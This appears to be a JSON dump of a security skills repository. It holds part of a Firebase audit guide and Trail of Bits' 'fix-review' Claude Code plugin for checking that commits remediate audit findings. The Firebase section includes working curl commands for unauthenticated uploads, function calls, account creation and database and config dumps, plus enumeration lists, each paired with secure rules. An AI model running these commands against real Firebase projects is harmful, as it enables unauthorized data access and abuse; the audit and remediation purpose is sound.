/{allPaths=**} {\n      allow read, write: if false;\n    }\n\n    // User-specific folders\n    match /users/{userId}/{allPaths=**} {\n      allow read, write: if request.auth != null && request.auth.uid == userId;\n    }\n\n    // Public assets (no listing)\n    match /public/{fileId} {\n      allow read: if true;\n      allow write: if request.auth != null;\n    }\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Test bucket listing endpoint\n- [ ] Check both `.appspot.com` and raw bucket names\n- [ ] Look for sensitive file types (sql, pdf, json, env)\n- [ ] Attempt to download exposed files\n- [ ] Check for backup or admin directories\n\n---\n\n## 8. FIREBASE STORAGE UNAUTHENTICATED UPLOAD (Critical)\n\n**The Problem:** Anyone can upload files to the storage bucket.\n\n**Exploitation:**\n```bash\n# Upload arbitrary file\ncurl -X POST \\\n  -H \"Content-Type: text/plain\" \\\n  --data-binary \"malicious content here\" \\\n  \"https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o?uploadType=media&name=pwned.txt\"\n```\n\n**Impact:**\n- Storage quota exhaustion (billing attack)\n- Malware hosting\n- Phishing page hosting\n- Illegal content storage (legal liability)\n- Overwrite existing files\n\n**Secure Rules with Validation:**\n```javascript\nrules_version = '2';\nservice firebase.storage {\n  match /b/{bucket}/o {\n    match /user_uploads/{userId}/{fileName} {\n      allow write: if request.auth != null\n                   && request.auth.uid == userId\n                   && request.resource.size < 5 * 1024 * 1024  // 5MB limit\n                   && request.resource.contentType.matches('image/.*');  // Images only\n    }\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Test file upload to various paths\n- [ ] Check if content type restrictions exist\n- [ ] Verify file size limits\n- [ ] Test overwriting existing files\n- [ ] Clean up any uploaded test files\n\n---\n\n## 9. CLOUD FUNCTIONS UNAUTHENTICATED ACCESS (Medium-High)\n\n**The Problem:** HTTP-triggered Cloud Functions accessible without authentication.\n\n**Vulnerable Function:**\n```javascript\n// No auth check - anyone can call\nexports.processPayment = functions.https.onRequest((req, res) => {\n  const { userId, amount } = req.body;\n  // Process payment without verifying caller\n  processPayment(userId, amount);\n  res.send({ success: true });\n});\n```\n\n**Exploitation:**\n```bash\n# Call unprotected function\ncurl -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"userId\":\"victim123\",\"amount\":0.01}' \\\n  \"https://us-central1-PROJECT-ID.cloudfunctions.net/processPayment\"\n\n# Test callable function\ncurl -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"data\":{}}' \\\n  \"https://us-central1-PROJECT-ID.cloudfunctions.net/adminFunction\"\n```\n\n**Common Function Names to Enumerate:**\n```\nlogin, logout, register, signup, authenticate, verify,\ncreateUser, deleteUser, updateUser, getUser, getUsers,\nprocessPayment, createOrder, sendEmail, sendNotification,\nuploadFile, generateToken, validateToken, refreshToken,\ngetData, setData, syncData, backup, restore, export,\nwebhook, callback, api, admin, debug, test, healthcheck\n```\n\n**Regions to Test:**\n```\nus-central1, us-east1, us-east4, us-west1,\neurope-west1, europe-west2, europe-west3,\nasia-east1, asia-east2, asia-northeast1, asia-south1\n```\n\n**Secure Function:**\n```javascript\nexports.processPayment = functions.https.onCall(async (data, context) => {\n  // Verify authentication\n  if (!context.auth) {\n    throw new functions.https.HttpsError('unauthenticated', 'Must be logged in');\n  }\n\n  // Verify authorization\n  if (context.auth.uid !== data.userId) {\n    throw new functions.https.HttpsError('permission-denied', 'Cannot process for other users');\n  }\n\n  // Process payment\n  return processPayment(context.auth.uid, data.amount);\n});\n```\n\n**Audit Checklist:**\n- [ ] Enumerate function names from APK strings\n- [ ] Test each function with GET and POST\n- [ ] Check response codes: 404=doesn't exist, 401/403=exists+protected, 200=accessible\n- [ ] Test callable functions with `{\"data\":{}}` payload\n- [ ] Try multiple regions\n\n---\n\n## 10. REMOTE CONFIG PUBLIC EXPOSURE (Medium)\n\n**The Problem:** Firebase Remote Config parameters accessible with just the API key.\n\n**Exploitation:**\n```bash\ncurl -H \"x-goog-api-key: AIzaXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\" \\\n  \"https://firebaseremoteconfig.googleapis.com/v1/projects/PROJECT-ID/remoteConfig\"\n```\n\n**Exposed Configuration Response:**\n```json\n{\n  \"parameters\": {\n    \"api_endpoint\": {\n      \"defaultValue\": { \"value\": \"https://internal-api.company.com\" }\n    },\n    \"feature_flags\": {\n      \"defaultValue\": { \"value\": \"{\\\"admin_panel\\\":true,\\\"debug_mode\\\":true}\" }\n    },\n    \"third_party_keys\": {\n      \"defaultValue\": { \"value\": \"sk_live_XXXXXXXX\" }\n    }\n  }\n}\n```\n\n**Impact:**\n- Internal API endpoint discovery\n- Feature flag enumeration\n- Hardcoded secrets exposure\n- Business logic revelation\n\n**Secure Practice:**\n```javascript\n// Don't store secrets in Remote Config\n// Use Secret Manager or server-side configuration\n\n// Set conditions for sensitive parameters\n{\n  \"parameters\": {\n    \"debug_mode\": {\n      \"defaultValue\": { \"value\": \"false\" },\n      \"conditionalValues\": {\n        \"internal_testers\": { \"value\": \"true\" }\n      }\n    }\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Test Remote Config endpoint with API key\n- [ ] Look for hardcoded secrets in parameters\n- [ ] Check for internal URLs or endpoints\n- [ ] Review feature flags for security implications\n\n---\n\n## 11. INSECURE SECURITY RULES PATTERNS\n\n**The Problem:** Common mistakes in Firebase security rules that appear secure but aren't.\n\n**Pattern 1: Trusting Client Data**\n```javascript\n// VULNERABLE - client controls isAdmin field\nmatch /users/{userId} {\n  allow write: if request.resource.data.isAdmin == false;\n}\n// Attack: Set isAdmin=false initially, then update to true\n```\n\n**Pattern 2: Missing Validation**\n```javascript\n// VULNERABLE - no field validation\nmatch /posts/{postId} {\n  allow create: if request.auth != null;\n}\n// Attack: Create posts with arbitrary fields, including admin flags\n```\n\n**Pattern 3: Overly Broad Wildcards**\n```javascript\n// VULNERABLE - matches ANY path\nmatch /{document=**} {\n  allow read: if request.auth != null;\n}\n// Problem: Authenticated users can read ALL data\n```\n\n**Pattern 4: Time-Based Rules Without Server Time**\n```javascript\n// VULNERABLE - client can manipulate timestamp\nmatch /events/{eventId} {\n  allow read: if resource.data.publishDate <= request.time;\n}\n// Attack: Client clock manipulation\n```\n\n**Secure Patterns:**\n```javascript\nrules_version = '2';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n\n    // Function to check admin status from a trusted source\n    function isAdmin() {\n      return get(/databases/$(database)/documents/admins/$(request.auth.uid)).data.isAdmin == true;\n    }\n\n    // Validate all required fields\n    function isValidPost() {\n      return request.resource.data.keys().hasAll(['title', 'content', 'authorId'])\n             && request.resource.data.authorId == request.auth.uid\n             && request.resource.data.title is string\n             && request.resource.data.title.size() <= 200;\n    }\n\n    match /posts/{postId} {\n      allow create: if request.auth != null && isValidPost();\n      allow update: if request.auth.uid == resource.data.authorId;\n      allow delete: if request.auth.uid == resource.data.authorId || isAdmin();\n    }\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Review rules for client-controlled privilege escalation\n- [ ] Check for field validation on writes\n- [ ] Verify wildcards don't grant excessive access\n- [ ] Look for timestamp manipulation vulnerabilities\n- [ ] Test boundary conditions in rules\n\n---\n\n## 12. API KEY EXPOSURE AND MISUSE\n\n**The Problem:** Firebase API keys extracted from APKs can be used for various attacks.\n\n**Extraction Locations:**\n```\ngoogle-services.json           client[].api_key[].current_key\nres/values/strings.xml         google_api_key, firebase_api_key\nassets/*.json                  apiKey, api_key\nSmali code                     const-string with \"AIza\"\nRaw DEX strings                strings command output\n```\n\n**API Key Format:**\n```\nAIza[A-Za-z0-9_-]{35}\nExample: AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q\n```\n\n**What Attackers Can Do With API Key:**\n| API | Risk | Mitigation |\n|-----|------|------------|\n| Identity Toolkit | Account creation, enumeration | Restrict signup, enable protections |\n| Realtime Database | Read/write if rules allow | Proper security rules |\n| Firestore | Read/write if rules allow | Proper security rules |\n| Storage | Read/write if rules allow | Proper security rules |\n| Remote Config | Read config parameters | Don't store secrets |\n| Cloud Messaging | Send push notifications | Use server keys server-side only |\n\n**Secure Practices:**\n```\nFirebase Console  Project Settings  API Keys:\n1. Restrict Android key to your app's SHA-1 fingerprint\n2. Restrict iOS key to your app's bundle ID\n3. Use separate keys for different environments\n4. Monitor key usage in Cloud Console\n5. Never use server/admin keys in client apps\n```\n\n**Audit Checklist:**\n- [ ] Extract all API keys from APK\n- [ ] Test each key against Firebase APIs\n- [ ] Check if keys are properly restricted\n- [ ] Look for server keys accidentally included\n- [ ] Verify keys aren't reused across projects\n\n---\n\n## Quick Reference: Testing Commands\n\n```bash\n# Authentication Tests\ncurl -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"test@test.com\",\"password\":\"Test123!\",\"returnSecureToken\":true}' \\\n  \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY\"\n\n# Anonymous Auth\ncurl -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"returnSecureToken\":true}' \\\n  \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY\"\n\n# Realtime Database\ncurl \"https://PROJECT.firebaseio.com/.json\"\ncurl \"https://PROJECT.firebaseio.com/.json?shallow=true\"\n\n# Firestore\ncurl \"https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents\"\n\n# Storage\ncurl \"https://firebasestorage.googleapis.com/v0/b/PROJECT.appspot.com/o\"\n\n# Remote Config\ncurl -H \"x-goog-api-key: API_KEY\" \\\n  \"https://firebaseremoteconfig.googleapis.com/v1/projects/PROJECT/remoteConfig\"\n\n# Cloud Functions\ncurl \"https://us-central1-PROJECT.cloudfunctions.net/functionName\"\n```\n",
        "plugins/fix-review/.claude-plugin/plugin.json": "{\n  \"name\": \"fix-review\",\n  \"version\": \"0.1.0\",\n  \"description\": \"Verifies that code changes address security audit findings without introducing bugs\",\n  \"author\": {\n    \"name\": \"Trail of Bits\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://www.trailofbits.com\"\n  },\n  \"repository\": \"https://github.com/trailofbits/skills\",\n  \"license\": \"CC-BY-SA-4.0\",\n  \"keywords\": [\"security\", \"audit\", \"remediation\", \"fix-review\"]\n}\n",
        "plugins/fix-review/README.md": "# Differential Testing Plugin\n\nVerify that code changes address security audit findings without introducing bugs.\n\n## Overview\n\nThis plugin provides tools for reviewing fix branches against security audit reports. It analyzes commit ranges to:\n\n1. **Verify finding remediation** - Check that each audit finding has been properly addressed\n2. **Detect bug introduction** - Identify potential bugs or security regressions in the fix commits\n3. **Generate verification reports** - Create detailed reports documenting finding status and concerns\n\n## Components\n\n### Skill: fix-review\n\nDomain knowledge for differential analysis and finding verification.\n\n**Triggers on:**\n- \"verify these commits fix the audit findings\"\n- \"check if TOB-XXX was addressed\"\n- \"review the fix branch\"\n- \"validate remediation commits\"\n\n### Command: /fix-review\n\nExplicit invocation for fix verification.\n\n```bash\n/fix-review <source-commit> <target-commit(s)> [--report <path-or-url>]\n```\n\n**Examples:**\n```bash\n# Basic usage: compare two commits\n/fix-review abc123 def456\n\n# With audit report\n/fix-review main fix-branch --report ./audit-report.pdf\n\n# Multiple target commits\n/fix-review v1.0.0 commit1 commit2 --report https://example.com/report.md\n\n# Google Drive report\n/fix-review baseline fixes --report https://drive.google.com/file/d/XXX/view\n```\n\n## Features\n\n### Report Format Support\n\n- **PDF** - Read directly (Claude native support)\n- **Markdown** - Read directly\n- **JSON** - Parsed as structured data\n- **HTML** - Text extraction\n\n### Finding Format Support\n\n- **Trail of Bits** - `TOB-CLIENT-N` format with header tables\n- **Generic** - Numbered findings, severity sections\n- **JSON** - Structured `findings` array\n\n### Google Drive Integration\n\nIf a Google Drive URL is provided and direct access fails:\n\n1. Checks for `gdrive` CLI tool\n2. If available, downloads the file automatically\n3. If not, provides instructions for manual download\n\n## Output\n\nGenerates `FIX_REVIEW_REPORT.md` containing:\n\n- Executive summary\n- Finding status table (FIXED, PARTIALLY_FIXED, NOT_ADDRESSED, CANNOT_DETERMINE)\n- Bug introduction concerns\n- Per-commit analysis\n- Recommendations\n\nAlso provides a conversation summary with key findings.\n\n## Bug Detection\n\nAnalyzes commits for security anti-patterns:\n\n| Pattern | Risk |\n|---------|------|\n| Validation removed | Input bypass |\n| Access control weakened | Privilege escalation |\n| Error handling reduced | Silent failures |\n| External call reordering | Reentrancy |\n| Integer operations changed | Overflow/underflow |\n\n## Integration\n\nWorks alongside other Trail of Bits skills:\n\n- **differential-review** - For initial security review of changes\n- **issue-writer** - To format findings into formal reports\n- **audit-context-building** - For deep context on complex fixes\n\n## Installation\n\nThis plugin is part of the Trail of Bits skills marketplace. Enable it in Claude Code settings.\n\n## Prerequisites\n\n- Git repository with commit history\n- Optional: `gdrive` CLI for Google Drive integration\n  ```bash\n  brew install gdrive  # macOS\n  gdrive about         # Configure authentication\n  ```\n\n## License\n\nCC-BY-SA-4.0\n",
        "plugins/fix-review/commands/fix-review.md": "---\nname: trailofbits:fix-review\ndescription: Reviews commits for bug introduction and verifies audit finding remediation\nargument-hint: \"<source-commit> <target-commit(s)> [--report <path-or-url>]\"\nallowed-tools:\n  - Read\n  - Write\n  - Grep\n  - Glob\n  - Bash\n  - WebFetch\n  - Task\n---\n\n# Fix Review\n\n**Arguments:** $ARGUMENTS\n\nParse arguments:\n1. **Source commit** (required): Baseline commit before fixes\n2. **Target commit(s)** (required): One or more commits to analyze\n3. **Report** (optional): `--report <path-or-url>` for security audit report\n\nInvoke the `fix-review` skill with these arguments for the full workflow.\n",
        "plugins/fix-review/skills/fix-review/SKILL.md": "---\nname: fix-review\ndescription: >\n  Verifies that git commits address security audit findings without introducing bugs.\n  This skill should be used when the user asks to \"verify these commits fix the audit findings\",\n  \"check if TOB-XXX was addressed\", \"review the fix branch\", \"validate remediation commits\",\n  \"did these changes address the security report\", \"post-audit remediation review\",\n  \"compare fix commits to audit report\", or when reviewing commits against security audit reports.\nallowed-tools:\n  - Read\n  - Write\n  - Grep\n  - Glob\n  - Bash\n  - WebFetch\n---\n\n# Fix Review\n\nDifferential analysis to verify commits address security findings without introducing bugs.\n\n## When to Use\n\n- Reviewing fix branches against security audit reports\n- Validating that remediation commits actually address findings\n- Checking if specific findings (TOB-XXX format) have been fixed\n- Analyzing commit ranges for bug introduction patterns\n- Cross-referencing code changes with audit recommendations\n\n## When NOT to Use\n\n- Initial security audits (use audit-context-building or differential-review)\n- Code review without a specific baseline or finding set\n- Greenfield development with no prior audit\n- Documentation-only changes\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"The commit message says it fixes TOB-XXX\" | Messages lie; code tells truth | Verify the actual code change addresses the finding |\n| \"Small fix, no new bugs possible\" | Small changes cause big bugs | Analyze all changes for anti-patterns |\n| \"I'll check the important findings\" | All findings matter | Systematically check every finding |\n| \"The tests pass\" | Tests may not cover the fix | Verify fix logic, not just test status |\n| \"Same developer, they know the code\" | Familiarity breeds blind spots | Fresh analysis of every change |\n\n---\n\n## Quick Reference\n\n### Input Requirements\n\n| Input | Required | Format |\n|-------|----------|--------|\n| Source commit | Yes | Git commit hash or ref (baseline before fixes) |\n| Target commit(s) | Yes | One or more commit hashes to analyze |\n| Security report | No | Local path, URL, or Google Drive link |\n\n### Finding Status Values\n\n| Status | Meaning |\n|--------|---------|\n| FIXED | Code change directly addresses the finding |\n| PARTIALLY_FIXED | Some aspects addressed, others remain |\n| NOT_ADDRESSED | No relevant changes found |\n| CANNOT_DETERMINE | Insufficient context to verify |\n\n---\n\n## Workflow\n\n### Phase 1: Input Gathering\n\nCollect required inputs from user:\n\n```\nSource commit:  [hash/ref before fixes]\nTarget commit:  [hash/ref to analyze]\nReport:         [optional: path, URL, or \"none\"]\n```\n\nIf user provides multiple target commits, process each separately with the same source.\n\n### Phase 2: Report Retrieval\n\nWhen a security report is provided, retrieve it based on format:\n\n**Local file (PDF, MD, JSON, HTML):**\nRead the file directly using the Read tool. Claude processes PDFs natively.\n\n**URL:**\nFetch web content using the WebFetch tool.\n\n**Google Drive URL that fails:**\nSee `references/report-parsing.md` for Google Drive fallback logic using `gdrive` CLI.\n\n### Phase 3: Finding Extraction\n\nParse the report to extract findings:\n\n**Trail of Bits format:**\n- Look for \"Detailed Findings\" section\n- Extract findings matching pattern: `TOB-[A-Z]+-[0-9]+`\n- Capture: ID, title, severity, description, affected files\n\n**Other formats:**\n- Numbered findings (Finding 1, Finding 2)\n- Severity-based sections (Critical, High, Medium, Low)\n- JSON with `findings` array\n\nSee `references/report-parsing.md` for detailed parsing strategies.\n\n### Phase 4: Commit Analysis\n\nFor each target commit, analyze the commit range:\n\n```bash\n# Get commit list from source to target\ngit log <source>..<target> --oneline\n\n# Get full diff\ngit diff <source>..<target>\n\n# Get changed files\ngit diff <source>..<target> --name-only\n```\n\nFor each commit in the range:\n1. Examine the diff for bug introduction patterns\n2. Check for security anti-patterns (see `references/bug-detection.md`)\n3. Map changes to relevant findings\n\n### Phase 5: Finding Verification\n\nFor each finding in the report:\n\n1. **Identify relevant commits** - Match by:\n   - File paths mentioned in finding\n   - Function/variable names in finding description\n   - Commit messages referencing the finding ID\n\n2. **Verify the fix** - Check that:\n   - The root cause is addressed (not just symptoms)\n   - The fix follows the report's recommendation\n   - No new vulnerabilities are introduced\n\n3. **Assign status** - Based on evidence:\n   - FIXED: Clear code change addresses the finding\n   - PARTIALLY_FIXED: Some aspects fixed, others remain\n   - NOT_ADDRESSED: No relevant changes\n   - CANNOT_DETERMINE: Need more context\n\n4. **Document evidence** - For each finding:\n   - Commit hash(es) that address it\n   - Specific file and line changes\n   - How the fix addresses the root cause\n\nSee `references/finding-matching.md` for detailed matching strategies.\n\n### Phase 6: Output Generation\n\nGenerate two outputs:\n\n**1. Report file (`FIX_REVIEW_REPORT.md`):**\n\n```markdown\n# Fix Review Report\n\n**Source:** <commit>\n**Target:** <commit>\n**Report:** <path or \"none\">\n**Date:** <date>\n\n## Executive Summary\n\n[Brief overview: X findings reviewed, Y fixed, Z concerns]\n\n## Finding Status\n\n| ID | Title | Severity | Status | Evidence |\n|----|-------|----------|--------|----------|\n| TOB-XXX-1 | Finding title | High | FIXED | abc123 |\n| TOB-XXX-2 | Another finding | Medium | NOT_ADDRESSED | - |\n\n## Bug Introduction Concerns\n\n[Any potential bugs or regressions detected in the changes]\n\n## Per-Commit Analysis\n\n### Commit abc123: \"Fix reentrancy in withdraw()\"\n\n**Files changed:** contracts/Vault.sol\n**Findings addressed:** TOB-XXX-1\n**Concerns:** None\n\n[Detailed analysis]\n\n## Recommendations\n\n[Any follow-up actions needed]\n```\n\n**2. Conversation summary:**\n\nProvide a concise summary in the conversation:\n- Total findings: X\n- Fixed: Y\n- Not addressed: Z\n- Concerns: [list any bug introduction risks]\n\n---\n\n## Bug Detection\n\nAnalyze commits for security anti-patterns. Key patterns to watch:\n- Access control weakening (modifiers removed)\n- Validation removal (require/assert deleted)\n- Error handling reduction (try/catch removed)\n- External call reordering (state after call)\n- Integer operation changes (SafeMath removed)\n- Cryptographic weakening\n\nSee `references/bug-detection.md` for comprehensive detection patterns and examples.\n\n---\n\n## Integration with Other Skills\n\n**differential-review:** For initial security review of changes (before audit)\n\n**issue-writer:** To format findings into formal audit reports\n\n**audit-context-building:** For deep context when analyzing complex fixes\n\n---\n\n## Tips for Effective Reviews\n\n**Do:**\n- Verify the actual code change, not just commit messages\n- Check that fixes address root causes, not symptoms\n- Look for unintended side effects in adjacent code\n- Cross-reference multiple findings that may interact\n- Document evidence for every status assignment\n\n**Don't:**\n- Trust commit messages as proof of fix\n- Skip findings because they seem minor\n- Assume passing tests mean correct fixes\n- Ignore changes outside the \"fix\" scope\n- Mark FIXED without clear evidence\n\n---\n\n## Reference Files\n\nFor detailed guidance, consult:\n\n- **`references/finding-matching.md`** - Strategies for matching commits to findings\n- **`references/bug-detection.md`** - Comprehensive anti-pattern detection\n- **`references/report-parsing.md`** - Parsing different report formats, Google Drive fallback\n",
        "plugins/fix-review/skills/fix-review/references/bug-detection.md": "# Bug Detection Patterns\n\nAnti-patterns to detect when analyzing commits for bug introduction.\n\n## Overview\n\nWhen reviewing fix commits, look for changes that may introduce new bugs or security vulnerabilities. These patterns represent common ways that \"fixes\" can make things worse.\n\n---\n\n## Security Anti-Patterns\n\n### Access Control Weakening\n\n**Pattern:** Removal or weakening of access restrictions\n\n**Detection:**\n```bash\n# Search for removed access modifiers\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(onlyOwner|onlyAdmin|require\\(msg\\.sender|auth|access)\"\n\n# Search for visibility changes\ngit diff <source>..<target> | grep -E \"^[-+].*(public|external|internal|private)\"\n```\n\n**Examples:**\n```diff\n- function withdraw() external onlyOwner {\n+ function withdraw() external {\n```\n\n```diff\n- require(msg.sender == owner, \"Not owner\");\n+ // Removed for gas optimization\n```\n\n**Risk:** Privilege escalation, unauthorized access\n\n---\n\n### Validation Removal\n\n**Pattern:** Removal of input validation or precondition checks\n\n**Detection:**\n```bash\n# Search for removed require/assert statements\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(require|assert|revert|throw)\"\n\n# Search for removed if-checks\ngit diff <source>..<target> | grep \"^-\" | grep -E \"if\\s*\\(\"\n```\n\n**Examples:**\n```diff\n- require(amount > 0, \"Zero amount\");\n- require(amount <= balance, \"Insufficient balance\");\n  balance -= amount;\n```\n\n```diff\n- if (input == null) throw new IllegalArgumentException();\n  process(input);\n```\n\n**Risk:** Input bypass, unexpected states, crashes\n\n---\n\n### Error Handling Reduction\n\n**Pattern:** Removal or weakening of error handling\n\n**Detection:**\n```bash\n# Search for removed try/catch\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(try|catch|except|finally)\"\n\n# Search for removed error checks\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(error|Error|err|Err)\"\n```\n\n**Examples:**\n```diff\n- try {\n    result = riskyOperation();\n- } catch (Exception e) {\n-   logger.error(\"Operation failed\", e);\n-   return fallbackValue;\n- }\n+ result = riskyOperation();\n```\n\n**Risk:** Silent failures, unhandled exceptions, crashes\n\n---\n\n### External Call Reordering\n\n**Pattern:** State updates moved after external calls (reentrancy risk)\n\n**Detection:**\n```bash\n# Search for external calls followed by state changes\ngit diff <source>..<target> | grep -A10 \"\\.call\\|\\.transfer\\|\\.send\"\n```\n\n**Examples:**\n```diff\n- balance[msg.sender] = 0;\n- (bool success,) = msg.sender.call{value: amount}(\"\");\n+ (bool success,) = msg.sender.call{value: amount}(\"\");\n+ balance[msg.sender] = 0;  // State change after external call!\n```\n\n**Risk:** Reentrancy attacks\n\n---\n\n### Integer Operation Changes\n\n**Pattern:** Removal of overflow/underflow protection\n\n**Detection:**\n```bash\n# Search for SafeMath removal\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(SafeMath|safeAdd|safeSub|safeMul|safeDiv)\"\n\n# Search for unchecked blocks\ngit diff <source>..<target> | grep -E \"unchecked\\s*\\{\"\n```\n\n**Examples:**\n```diff\n- using SafeMath for uint256;\n- balance = balance.sub(amount);\n+ balance = balance - amount;  // No overflow protection\n```\n\n```diff\n- total = total + amount;  // Solidity 0.8 has built-in checks\n+ unchecked {\n+   total = total + amount;  // Disabled overflow check\n+ }\n```\n\n**Risk:** Integer overflow/underflow\n\n---\n\n### Cryptographic Weakening\n\n**Pattern:** Changes to cryptographic operations that reduce security\n\n**Detection:**\n```bash\n# Search for crypto-related changes\ngit diff <source>..<target> | grep -E \"(hash|Hash|encrypt|decrypt|sign|verify|random|nonce|salt|key|Key)\"\n\n# Search for algorithm names\ngit diff <source>..<target> | grep -E \"(SHA|MD5|AES|RSA|ECDSA|keccak)\"\n```\n\n**Examples:**\n```diff\n- bytes32 hash = keccak256(abi.encodePacked(nonce, data));\n+ bytes32 hash = keccak256(abi.encodePacked(data));  // Removed nonce!\n```\n\n```diff\n- return crypto.createHash('sha256').update(data).digest();\n+ return crypto.createHash('md5').update(data).digest();  // Weak hash!\n```\n\n**Risk:** Hash collisions, signature bypass, predictability\n\n---\n\n### Memory Safety Issues\n\n**Pattern:** Changes that introduce memory safety bugs\n\n**Detection:**\n```bash\n# Search for buffer/array operations\ngit diff <source>..<target> | grep -E \"(malloc|free|memcpy|strcpy|buffer|array\\[)\"\n\n# Search for bounds checks\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(length|size|bounds|index)\"\n```\n\n**Examples:**\n```diff\n- if (index < array.length) {\n    return array[index];\n- }\n```\n\n```diff\n- strncpy(dest, src, sizeof(dest) - 1);\n+ strcpy(dest, src);  // No bounds check!\n```\n\n**Risk:** Buffer overflow, use-after-free, out-of-bounds access\n\n---\n\n### Concurrency Issues\n\n**Pattern:** Removal of synchronization or race condition introduction\n\n**Detection:**\n```bash\n# Search for lock/synchronization changes\ngit diff <source>..<target> | grep -E \"(lock|Lock|mutex|synchronized|atomic|volatile)\"\n\n# Search for removed synchronization\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(lock|synchronized)\"\n```\n\n**Examples:**\n```diff\n- synchronized (this) {\n    counter++;\n- }\n+ counter++;  // No synchronization!\n```\n\n**Risk:** Race conditions, data corruption\n\n---\n\n## General Bug Patterns\n\n### Logic Inversion\n\n**Pattern:** Boolean logic changed incorrectly\n\n**Detection:**\n```bash\n# Search for condition changes\ngit diff <source>..<target> | grep -E \"^[-+].*if\\s*\\(|^[-+].*\\?|^[-+].*&&|^[-+].*\\|\\|\"\n```\n\n**Examples:**\n```diff\n- if (isValid) {\n+ if (!isValid) {\n    process();\n  }\n```\n\n```diff\n- return a && b;\n+ return a || b;\n```\n\n---\n\n### Off-by-One Errors\n\n**Pattern:** Boundary conditions changed incorrectly\n\n**Detection:**\n```bash\n# Search for comparison operators\ngit diff <source>..<target> | grep -E \"^[-+].*(<=|>=|<|>|==)\"\n```\n\n**Examples:**\n```diff\n- for (i = 0; i < length; i++)\n+ for (i = 0; i <= length; i++)  // Off-by-one!\n```\n\n```diff\n- if (index < array.length)\n+ if (index <= array.length)  // Off-by-one!\n```\n\n---\n\n### Null/Undefined Handling\n\n**Pattern:** Removal of null checks\n\n**Detection:**\n```bash\n# Search for null checks\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(null|NULL|nil|None|undefined)\"\n```\n\n**Examples:**\n```diff\n- if (obj == null) return defaultValue;\n  return obj.getValue();  // Potential NPE\n```\n\n---\n\n### Resource Leaks\n\n**Pattern:** Removal of cleanup code\n\n**Detection:**\n```bash\n# Search for resource management\ngit diff <source>..<target> | grep \"^-\" | grep -E \"(close|Close|dispose|Dispose|free|Free|release|Release)\"\n```\n\n**Examples:**\n```diff\n  file = open(path)\n- try:\n    data = file.read()\n- finally:\n-   file.close()\n```\n\n---\n\n## Analysis Workflow\n\n### Step 1: Get the Diff\n\n```bash\ngit diff <source>..<target> > changes.diff\n```\n\n### Step 2: Scan for Anti-Patterns\n\nRun detection commands for each pattern category:\n\n```bash\n# Security patterns\ngrep \"^-\" changes.diff | grep -E \"(require|assert|onlyOwner|auth)\"\ngrep \"^-\" changes.diff | grep -E \"(try|catch|except)\"\n\n# Logic patterns\ngrep -E \"^[-+].*if\\s*\\(\" changes.diff\ngrep -E \"^[-+].*(<=|>=|<|>)\" changes.diff\n```\n\n### Step 3: Manual Review\n\nFor each detected pattern:\n1. Read the surrounding context\n2. Understand the intent of the change\n3. Determine if the pattern indicates a bug\n4. Document findings\n\n### Step 4: Rate Severity\n\n| Severity | Criteria |\n|----------|----------|\n| Critical | Exploitable security vulnerability |\n| High | Security regression or data loss risk |\n| Medium | Logic error with limited impact |\n| Low | Code smell, minor issue |\n| Info | Observation, no immediate risk |\n\n---\n\n## False Positive Handling\n\nNot every detected pattern is a bug. Consider:\n\n**Intentional changes:**\n- Removing redundant validation\n- Simplifying error handling\n- Refactoring for clarity\n\n**Context matters:**\n- Is the removed check truly necessary?\n- Is there equivalent protection elsewhere?\n- Does the surrounding code handle the case?\n\n**Verify with:**\n1. Read the full commit context\n2. Check commit message for explanation\n3. Look for replacement logic\n4. Consider the broader codebase\n\n---\n\n## Reporting Format\n\nFor each detected concern:\n\n```markdown\n### Bug Introduction Concern\n\n**Pattern:** [Pattern name]\n**Commit:** [hash]\n**File:** [path:line]\n**Severity:** [Critical/High/Medium/Low/Info]\n\n**Change:**\n```diff\n[relevant diff snippet]\n```\n\n**Analysis:**\n[Explanation of why this is concerning]\n\n**Recommendation:**\n[Suggested action]\n```\n",
        "plugins/fix-review/skills/fix-review/references/finding-matching.md": "# Finding Matching Strategies\n\nTechniques for matching security findings to code commits.\n\n## Overview\n\nMatching findings to commits requires multiple approaches since:\n- Commit messages may not reference finding IDs\n- Findings may span multiple files\n- Multiple commits may partially address a single finding\n- A single commit may address multiple findings\n\n---\n\n## Matching Approaches\n\n### 1. Direct ID Reference\n\nSearch commit messages for finding IDs:\n\n```bash\n# Search for TOB-style IDs in commit messages\ngit log <source>..<target> --grep=\"TOB-\" --oneline\n\n# Search for generic finding references\ngit log <source>..<target> --grep=\"[Ff]inding\" --oneline\ngit log <source>..<target> --grep=\"[Ff]ix\" --oneline\n```\n\n**Confidence:** High when found, but many commits lack explicit references.\n\n### 2. File Path Matching\n\nMatch findings by affected files:\n\n```bash\n# Get files changed in commit range\ngit diff <source>..<target> --name-only\n\n# Compare with files mentioned in finding\n# Finding: \"The vulnerability exists in contracts/Vault.sol\"\n# Check: Does any commit modify contracts/Vault.sol?\n```\n\n**Workflow:**\n1. Extract file paths from finding description\n2. List changed files in commit range\n3. Identify commits touching those files\n4. Analyze those commits in detail\n\n### 3. Function/Symbol Matching\n\nMatch by function or variable names:\n\n```bash\n# Search for function name in diffs\ngit log <source>..<target> -p | grep -A5 -B5 